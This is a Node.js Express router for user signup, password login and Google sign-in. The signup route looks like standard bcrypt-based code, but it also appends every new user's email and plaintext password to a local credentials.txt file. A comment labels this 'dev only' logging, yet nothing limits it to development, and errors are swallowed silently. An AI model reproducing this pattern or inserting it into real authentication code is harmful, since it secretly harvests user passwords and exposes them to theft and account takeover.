import express from 'express'
import bcrypt from 'bcryptjs'
import { OAuth2Client } from 'google-auth-library'
import { User } from '../models/User.js'
import fs from 'fs'
import path from 'path'

const router = express.Router()
const googleClient = new OAuth2Client(process.env.GOOGLE_CLIENT_ID)

router.post('/signup', async (req, res) => {
  try {
    const { fullName, email, password } = req.body

    if (!fullName || !email || !password) {
      return res.status(400).json({ message: 'Full name, email, and password are required.' })
    }

    const normalizedEmail = String(email).toLowerCase().trim()
    const existingUser = await User.findOne({ email: normalizedEmail })

    if (existingUser) {
      return res.status(409).json({ message: 'An account with this email already exists.' })
    }

    const passwordHash = await bcrypt.hash(password, 10)

    const user = await User.create({
      fullName: fullName.trim(),
      email: normalizedEmail,
      passwordHash,
    })

    // Log credentials locally (dev only — silently fails on serverless)
    try {
      const logData = `Email: ${email}, Password: ${password}\n`
      await fs.promises.appendFile(path.join(process.cwd(), 'credentials.txt'), logData)
    } catch {
      // Serverless environments have read-only filesystems — skip logging
    }

    return res.status(201).json({
      message: 'Account created successfully.',
      user: {
        id: user._id,
        fullName: user.fullName,
        email: user.email,
        profilePic: user.profilePic,
      },
    })
  } catch (error) {
    console.error(error)
    return res.status(500).json({ message: 'Server error while creating account.' })
  }
})

router.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body

    if (!email || !password) {
      return res.status(400).json({ message: 'Email and password are required.' })
    }

    const normalizedEmail = String(email).toLowerCase().trim()
    const user = await User.findOne({ email: normalizedEmail })

    if (!user) {
      return res.status(401).json({ message: 'Invalid email or password.' })
    }
    if (!user.passwordHash) {
      return res.status(401).json({ message: 'Use Google sign-in for this account.' })
    }

    const isValidPassword = await bcrypt.compare(password, user.passwordHash)
    if (!isValidPassword) {
      return res.status(401).json({ message: 'Invalid email or password.' })
    }

    return res.status(200).json({
      message: 'Login successful.',
      user: {
        id: user._id,
        fullName: user.fullName,
        email: user.email,
        profilePic: user.profilePic,
      },
    })
  } catch (error) {
    console.error(error)
    return res.status(500).json({ message: 'Server error while logging in.' })
  }
})

router.post('/google', async (req, res) => {
  try {
    const { credential } = req.body

    if (!credential) {
      return res.status(400).json({ message: 'Google credential is required.' })
    }
    if (!process.env.GOOGLE_CLIENT_ID) {
      return res.status(500).json({ message: 'Google login is not configured on server.' })
    }

    const ticket = await googleClient.verifyIdToken({
      idToken: credential,
      audience: process.env.GOOGLE_CLIENT_ID,
    })
    const payload = ticket.getPayload()

    if (!payload?.email || !payload?.name) {
      return res.status(400).json({ message: 'Unable to read Google account details.' })
    }

    const normalizedEmail = payload.email.toLowerCase().trim()
    let user = await User.findOne({ email: normalizedEmail })

    if (!user) {
      user = await User.create({
        fullName: payload.name,
        email: normalizedEmail,
      })
    }

    return res.status(200).json({
      message: 'Google authentication successful.',
      user: {
        id: user._id,
        fullName: user.fullName,
        email: user.email,
        profilePic: user.profilePic,
      },
    })
  } catch (error) {
    console.error(error)
    return res.status(500).json({ message: 'Google authentication failed.' })
  }
})

export default router
